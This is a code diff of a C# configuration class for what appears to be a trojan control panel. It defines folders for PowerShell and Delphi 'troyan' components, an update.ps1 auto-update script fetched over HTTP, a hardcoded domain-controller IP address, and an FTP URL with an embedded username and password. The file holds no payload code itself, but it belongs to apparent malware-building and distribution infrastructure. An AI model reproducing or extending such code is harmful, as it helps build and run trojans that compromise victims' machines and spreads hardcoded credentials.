@@ -4,10 +4,76 @@ namespace cp.Models;
 
 public class ServerModel
 {
-    [JsonPropertyName("server")] 
+    // statics
+    public static string RootDirStatic 
+    {
+        get
+        {
+            if (Directory.Exists(@"C:\hephaestus"))
+                return @"C:\hephaestus";
+            if (Directory.Exists(@"C:\users\kgons\source\repos\hephaestus"))
+                return @"C:\users\kgons\source\repos\hephaestus";
+            if (Directory.Exists(@"C:\_temp"))
+                return @"C:\_temp";
+            throw new InvalidOperationException("Root folder is not exists");
+        }
+    }
+    [JsonPropertyName("rootDir")] public string RootDir => RootDirStatic;
     
+    public static string DomainControllerStatic = "185.247.141.76";
+    [JsonPropertyName("domainController")]
+    public string DomainController => DomainControllerStatic;
+    
+    public static string CpDirStatic => Path.Combine(RootDirStatic, "cp");
+    [JsonPropertyName("cpDir")] public string CpDir => CpDirStatic;
+    
+    public static string CertDirStatic => Path.Combine(RootDirStatic, "cert");
+    [JsonPropertyName("certDir")] public string CertDir => CertDirStatic;
+    
+    public static string SysDirStatic => Path.Combine(RootDirStatic, "sys");
+    [JsonPropertyName("sysDir")] public string SysDir => SysDirStatic;
+    
+    public static string CmplDirStatic => Path.Combine(RootDirStatic, "cmpl");
+    [JsonPropertyName("cmplDir")] public string CmplDir => CmplDirStatic;
+    
+    public static string AdsDirStatic => Path.Combine(RootDirStatic, "ads");
+    [JsonPropertyName("adsDir")] public string AdsDir => AdsDirStatic;
+    
+    public static string UpdDirStatic => Path.Combine(RootDirStatic, "troyan/upd");
+    [JsonPropertyName("updDir")] public string UpdDir => UpdDirStatic;
+    [JsonPropertyName("updateFile")] public string UpdateFile => Path.Combine(UpdDir, "update.ps1");
+    
+    public static string TroyanScriptDirStatic => Path.Combine(RootDirStatic, "troyan/troyanps");
+    [JsonPropertyName("troyanScriptDir")] public string TroyanScriptDir => TroyanScriptDirStatic;
+    
+    public static string TroyanDelphiDirStatic => Path.Combine(RootDirStatic, "troyan/troyandelphi");
+    [JsonPropertyName("troyanDelphiDir")] public string TroyanDelphiDir => TroyanDelphiDirStatic;
+    
+    
+    // server-depended
+    [JsonPropertyName("server")] 
     public string Server { get; set; }
     
+    [JsonPropertyName("userDataDir")] public string UserDataDir => @$"C:\data\{Server}";
+    
+    [JsonPropertyName("userServerFile")] public string UserServerFile => Path.Combine(UserDataDir, "server.json");
+    
+    [JsonPropertyName("ftpAds")]
+    public string FtpAds => $@"ftp://ftpads:Abc12345!@{Server}";
+    
+    [JsonPropertyName("ftpAdsAsHttp")]
+    public string FtpAdsAsHttp => $@"http://{Server}/ads";
+
+    [JsonPropertyName("ftpUserData")] public string FtpUserData { get; set; }
+    
+    [JsonPropertyName("ftpUserDataAsHttp")]
+    public string FtpUserDataAsHttp =>  $@"http://{Server}/data";
+    
+    [JsonPropertyName("updateUrl")] public string UpdateUrl => $"http://{Server}/data/update.txt";
+    
+    
+    
+    // properties
     [JsonPropertyName("login")] 
     public string Login { get; set; }
     
@@ -32,8 +98,6 @@ public class ServerModel
     [JsonPropertyName("autoUpdate")]
     public bool AutoUpdate { get; set; }
 
-    [JsonPropertyName("updateUrl")] public string UpdateUrl => $"http://{Server}/data/update.txt";
-
     [JsonPropertyName("domains")]
     public List<string> Domains { get; set; }
     
@@ -54,7 +118,17 @@ public class ServerModel
 
     [JsonPropertyName("embeddings")]
     public List<string> Embeddings { get; set; }
-
+    
+    
+    //resulting
+    [JsonIgnore]
+    public string[] AllSevers { get; set; }
+    
+    [JsonIgnore]
+    public string? Result { get; set; }
+    
+    
+    //constructor
     public ServerModel()
     {
         Server = "1.1.1.1";
@@ -72,41 +146,4 @@ public class ServerModel
         ExtractIconFromFront = false;
         Embeddings = new List<string>();
     }
-
-    [JsonPropertyName("domainController")]
-    public string DomainController => "185.247.141.76";
-    
-    [JsonPropertyName("userRootFolder")] public string UserRootFolder => @"C:\_x";
-    
-    [JsonPropertyName("userCertDir")] public string UserCertDir => Path.Combine(UserRootFolder, "cert");
-    
-    [JsonPropertyName("userServakDir")] public string UserServakDir => Path.Combine(UserRootFolder, "servak");
-    
-    [JsonPropertyName("userServachokDir")] public string UserServachokDir => Path.Combine(UserRootFolder, "servachok");
-
-    [JsonPropertyName("userDataFolder")] public string UserDataFolder => @"C:\_x\data";
-    
-    [JsonPropertyName("userServerFile")] public string UserServerFile => Path.Combine(UserDataFolder, "server.json");
-    
-    [JsonPropertyName("updateFile")] public string UpdateFile => Path.Combine(UserDataFolder, "update.txt");
-    
-    [JsonPropertyName("userWebFolder")] public string UserWebFolder => @"C:\inetpub\wwwroot\_web";
-    
-    
-    [JsonPropertyName("ftpWeb")]
-    public string FtpWeb => $@"ftp://ftpweb:Abc12345!@{Server}";
-
-    [JsonPropertyName("ftpUserData")] public string FtpUserData { get; set; }
-    
-    [JsonPropertyName("ftpWebAsHttp")]
-    public string FtpWebAsHttp => $@"http://{Server}/web";
-    
-    [JsonPropertyName("ftpUserDataAsHttp")]
-    public string FtpUserDataAsHttp =>  $@"http://{Server}/data";
-    
-    [JsonIgnore]
-    public string[] AllSevers { get; set; }
-    
-    [JsonIgnore]
-    public string? Result { get; set; }
 }
